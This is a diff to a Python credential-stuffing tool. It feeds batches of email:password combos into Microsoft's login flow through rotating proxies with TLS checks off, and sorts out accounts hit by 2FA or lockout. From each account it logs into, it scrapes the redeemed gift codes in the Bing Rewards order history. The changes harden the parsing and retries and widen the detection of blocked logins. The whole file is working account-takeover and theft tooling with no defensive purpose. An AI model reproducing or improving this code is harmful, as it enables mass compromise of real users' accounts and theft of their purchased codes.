@@ -34,7 +34,9 @@ def create_optimized_session(proxy=None):
     return session
 
 def get_urlPost_sFTTag(session):
-    for _ in range(3):
+    maxretries = 3
+    attempts = 0
+    while attempts < maxretries:
         try:
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
@@ -45,30 +47,48 @@ def get_urlPost_sFTTag(session):
                 'Upgrade-Insecure-Requests': '1'
             }
             text = session.get(sFTTag_url, headers=headers, timeout=10, verify=False).text
-            match = re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S) or re.search('name="PPFT".*?value="(.+?)"', text, re.S)
+            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
+                   re.search('value="(.+?)"', text, re.S) or \
+                   re.search("sFTTag:'(.+?)'", text, re.S) or \
+                   re.search('sFTTag:"(.+?)"', text, re.S) or \
+                   re.search('name="PPFT".*?value="(.+?)"', text, re.S)
             if match:
                 sFTTag = match.group(1)
-                match = re.search('"urlPost":"(.+?)"', text, re.S) or re.search('<form.*?action="(.+?)"', text, re.S)
+                match = re.search('"urlPost":"(.+?)"', text, re.S) or \
+                       re.search("urlPost:'(.+?)'", text, re.S) or \
+                       re.search('urlPost:"(.+?)"', text, re.S) or \
+                       re.search('<form.*?action="(.+?)"', text, re.S)
                 if match:
-                    urlPost = match.group(1).replace('&amp;', '&')
+                    urlPost = match.group(1)
+                    urlPost = urlPost.replace('&amp;', '&')
                     return (urlPost, sFTTag, session)
         except:
-            time.sleep(0.1)
+            pass
+        attempts += 1
+        time.sleep(0.1)
     return (None, None, session)
 
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
-    for _ in range(3):
+    maxretries = 3
+    tries = 0
+    while tries < maxretries:
         try:
             data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
             headers = {
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'close'
             }
             login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=10, verify=False)
-            if '#' in login_request.url:
+            
+            if '#' in login_request.url and login_request.url != sFTTag_url:
                 token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                 if token != 'None':
                     return (token, session)
+            
             elif 'cancel?mkt=' in login_request.text:
                 try:
                     ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
@@ -87,18 +107,27 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
                                     return (token, session)
                 except:
                     pass
-            elif any(v in login_request.text for v in ['recover?mkt', 'account.live.com/identity/confirm?mkt']):
+            
+            elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                 return ('2FA', session)
-            elif any(v in login_request.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account']):
+            
+            elif any(value in login_request.text.lower() for value in [
+                'password is incorrect', "account doesn't exist",
+                "that microsoft account doesn't exist", 'sign in to your microsoft account',
+                "tried to sign in too many times with an incorrect account or password",
+                'help us protect your account'
+            ]):
                 return ('None', session)
         except:
-            time.sleep(0.1)
+            pass
+        tries += 1
+        time.sleep(0.1)
     return ('None', session)
 
 def detect_category(text):
     text_lower = text.lower()
-    for cat, keywords in CATEGORIES.items():
-        if any(kw in text_lower for kw in keywords):
+    for cat, config in CATEGORIES.items():
+        if any(kw in text_lower for kw in config):
             return cat
     return 'Unknown'
 
@@ -110,25 +139,36 @@ def extract_amount(text):
     points = re.search(r'(\d+)\s*(?:points|coins|robux|rp)', text_lower)
     if points:
         return f"{points.group(1)}"
+    months = re.search(r'(\d+)\s*(?:month|months)', text_lower)
+    if months:
+        return f"{months.group(1)}M"
     return None
 
 def fetch_codes(email, password, timeout=10, proxy=None):
+    """Check one account and return codes found - EXACT GUI LOGIC"""
     session = create_optimized_session(proxy)
+    
     urlPost, sFTTag, session = get_urlPost_sFTTag(session)
     if not urlPost or not sFTTag:
         return None
+    
     token_result = get_xbox_rps(session, email, password, urlPost, sFTTag)
+    
     if isinstance(token_result, tuple):
         token, session = token_result
     else:
         return None
-    if not token or token in ('None', '2FA'):
+    
+    if not token or token == 'None' or token == '2FA':
         return None
+    
     url = 'https://rewards.bing.com/redeem/orderhistory'
     headers = {'User-Agent': 'Mozilla/5.0', 'Referer': 'https://rewards.bing.com/'}
+    
     try:
         r = session.get(url, headers=headers, timeout=timeout, verify=False)
         text = r.text
+        
         if 'fmHF' in text:
             soup = BeautifulSoup(text, 'html.parser')
             form = soup.find('form', id='fmHF')
@@ -143,59 +183,103 @@ def fetch_codes(email, password, timeout=10, proxy=None):
                 session.post(action, data=data, timeout=timeout, verify=False)
                 r = session.get(url, headers=headers, timeout=timeout, verify=False)
                 text = r.text
+        
         soup = BeautifulSoup(text, 'html.parser')
+        
         verification_token = ''
         token_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
         if token_input and token_input.has_attr('value'):
             verification_token = token_input['value']
+        
         table = soup.find('table', class_='table')
-        rows = table.find_all('tr') if table else []
+        rows = []
+        if table:
+            rows = table.find_all('tr')
+        
         codes_found = []
-        seen = set()
+        seen_codes_local = set()
+        
         for row in rows:
             cells = row.find_all(['td', 'th'])
             if len(cells) < 3:
                 continue
+            
             get_code = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
+            
             if get_code:
                 action_url = get_code.get('data-actionurl', '').replace('&amp;', '&')
                 order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
+                
                 if action_url.startswith('/'):
                     action_url = 'https://rewards.bing.com' + action_url
+                
                 try:
-                    post_data = {'__RequestVerificationToken': verification_token} if verification_token else {}
-                    code_headers = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
+                    post_data = {}
+                    if verification_token:
+                        post_data['__RequestVerificationToken'] = verification_token
+                    
+                    code_headers = {
+                        'User-Agent': 'Mozilla/5.0',
+                        'X-Requested-With': 'XMLHttpRequest',
+                    }
+                    
                     code_resp = session.post(action_url, data=post_data, headers=code_headers, timeout=timeout, verify=False)
                     code_html = code_resp.text
+                    code_soup = BeautifulSoup(code_html, 'html.parser')
+                    
                     code = None
-                    for pattern in [r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
-                                  r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
-                                  r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}']:
-                        match = re.search(pattern, code_html)
-                        if match and '*' not in match.group():
-                            code = match.group()
-                            break
-                    if code and code not in seen:
-                        seen.add(code)
+                    
+                    # Try resendSuccess div (from original GUI)
+                    rs = code_soup.find('div', class_='resendSuccess')
+                    if rs:
+                        keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
+                        vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
+                        for k, v in zip(keys, vals):
+                            if 'CODE' in k.get_text(strip=True).upper():
+                                code = v.get_text(strip=True)
+                                break
+                    
+                    # Try all regex patterns (from original GUI)
+                    if not code or '*' in code:
+                        for pattern in [r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}', 
+                                      r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
+                                      r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
+                                      r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}']:
+                            match = re.search(pattern, code_html)
+                            if match:
+                                code = match.group()
+                                if '*' not in code:
+                                    break
+                    
+                    if code and '*' not in code and code not in seen_codes_local:
+                        seen_codes_local.add(code)
                         cat = detect_category(order_title)
                         amount = extract_amount(order_title)
                         info = f"{cat} CODE"
                         if amount:
                             info = f"{amount} {info}"
+                        
                         codes_found.append({
-                            'code': code, 'info': info, 'email': email,
-                            'password': password, 'category': cat, 'title': order_title
+                            'code': code,
+                            'info': info,
+                            'email': email,
+                            'password': password,
+                            'category': cat,
+                            'title': order_title
                         })
                 except:
                     continue
+        
         if codes_found:
             return {'email': email, 'password': password, 'codes': codes_found}
         else:
             return {'email': email, 'password': password, 'valid': True}
+            
     except:
         return None
 
 def check_batch(combos, max_threads=10, timeout=10, proxies=None):
+    """Check a batch of combos and return results with all details."""
     results = {
         'valid_accounts': [],
         'invalid_accounts': [],
@@ -203,6 +287,7 @@ def check_batch(combos, max_threads=10, timeout=10, proxies=None):
         'total': len(combos),
         'checked': 0
     }
+    
     def process(combo):
         if ':' not in combo:
             return None, combo
@@ -210,11 +295,13 @@ def check_batch(combos, max_threads=10, timeout=10, proxies=None):
         proxy = random.choice(proxies) if proxies else None
         result = fetch_codes(email.strip(), password.strip(), timeout, proxy)
         return result, combo
+    
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = {executor.submit(process, c): c for c in combos}
         for future in as_completed(futures):
             result, combo = future.result()
             results['checked'] += 1
+            
             if result and 'codes' in result and result['codes']:
                 results['valid_accounts'].append(f"{result['email']}:{result['password']}")
                 results['codes'].extend(result['codes'])
@@ -222,5 +309,9 @@ def check_batch(combos, max_threads=10, timeout=10, proxies=None):
                 results['valid_accounts'].append(f"{result['email']}:{result['password']}")
             else:
                 if ':' in combo:
-                    results['invalid_accounts'].append(combo.split(':')[0])
+                    email_addr = combo.split(':')[0]
+                    results['invalid_accounts'].append(email_addr)
+                elif result and 'email' in result:
+                    results['invalid_accounts'].append(result['email'])
+    
     return results
